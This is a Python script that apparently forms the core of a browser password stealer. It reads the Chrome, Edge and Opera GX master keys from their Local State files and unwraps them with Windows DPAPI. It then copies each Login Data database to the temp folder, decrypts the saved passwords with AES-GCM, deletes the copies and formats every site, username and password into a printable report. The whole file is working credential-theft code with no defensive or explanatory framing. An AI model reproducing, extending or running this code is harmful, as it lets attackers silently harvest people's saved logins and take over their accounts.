import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import time
import tempfile

temp_dir = tempfile.gettempdir()

# ----------------------------------------------------- EDGE ------------------------------------------------------------------------

def get_edge_key():
    try:
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    except: exit()
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password_edge(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e: return "Chrome < 80"

def get_passwords_edge():
    master_key = get_edge_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
    try: shutil.copy2(login_db, f"{temp_dir}\Loginvault.db")
    except: pass
    conn = sqlite3.connect(f"{temp_dir}\Loginvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        result = {}
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password_edge(encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                result[url] = [username, decrypted_password]
    except: pass

    cursor.close(); conn.close()
    try: os.remove(f"{temp_dir}\Loginvault.db")
    except Exception as e: pass; pass

    return result


# ----------------------------------------------------------------- CHROME ------------------------------------------------------------------

def get_chrome_encryption_key():
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except: time.sleep(1)

def decrypt_password_chrome(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try: return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except: return ""

def get_passwords_chrome():
    key = get_chrome_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    file_name = "ChromeData.db"
    shutil.copyfile(db_path, f"{temp_dir}\{file_name}")
    db = sqlite3.connect(f"{temp_dir}\{file_name}")
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    result = {}
    for row in cursor.fetchall():
        action_url = row[1]
        username = row[2]
        password = decrypt_password_chrome(row[3], key)
        if username or password:
            result[action_url] = [username, password]
        else: continue
    cursor.close(); db.close()
    try: os.remove(f"{temp_dir}\{file_name}")
    except: pass
    return result

# --------------------------------------------------------------------------- OPERA GX -----------------------------------------------------------------

def get_operagx_encryption_key():
    try:
        #os.path.join(roaming, "Opera Software", "Opera GX Stable")
        local_state_path = os.path.join(os.environ["APPDATA"], "Opera Software", "Opera GX Stable", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except: time.sleep(1)

def decrypt_password_operagx(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try: return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except: return ""

def get_passwords_operagx():
    key = get_operagx_encryption_key()
    db_path = os.path.join(os.environ["APPDATA"], "Opera Software", "Opera GX Stable", "Login Data")
    file_name = "OperaGXdata.db"
    shutil.copyfile(db_path, f"{temp_dir}\{file_name}")
    db = sqlite3.connect(f"{temp_dir}\{file_name}")
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    result = {}
    for row in cursor.fetchall():
        action_url = row[1]
        username = row[2]
        password = decrypt_password_chrome(row[3], key)
        if username or password:
            result[action_url] = [username, password]
        else: continue
    cursor.close(); db.close()
    try: os.remove(f"{temp_dir}\{file_name}")
    except: pass
    return result

# ------------------------------------------------------------------------------------------------------------------------------------------------------

def grab_passwords():
    try: chrome = get_passwords_chrome()
    except Exception as e: print(f"chrome failed\n{e}")

    try: edge = get_passwords_edge()
    except Exception as e: print(f"edge failed\n{e}")

    try: operagx = get_passwords_operagx()
    except Exception as e: print(f"operagx failed\n{e}")

    return chrome, edge, operagx


order = ["Chrome", "Edge", "Opera GX"]

def get_pass_formatted():
    res = ""
    for browser_index, browser in enumerate(order):
        try:
            res += f"{browser}:\n"
            res += "┌─────────────────────────────────────────────────────────────────────────────────────┐\n"
            passes = grab_passwords()[browser_index]
            for index, site in enumerate(passes):
                if site.strip() != "":
                    res+=('│ 🌐 SITE: %-75s%s' % (site, "│")) + "\n"
                res+=('│ 👤 USER: %-75s%s' % (passes[site][0], "│")) + "\n"
                res+=('│ 🔑 PASS: %-75s%s' % (passes[site][1], "│")) + "\n"

                if index != len(passes) - 1:
                    res+="├─────────────────────────────────────────────────────────────────────────────────────┤\n"
                else:
                    res+="└─────────────────────────────────────────────────────────────────────────────────────┘\n\n"
        except Exception as e:
            print(e)

    return res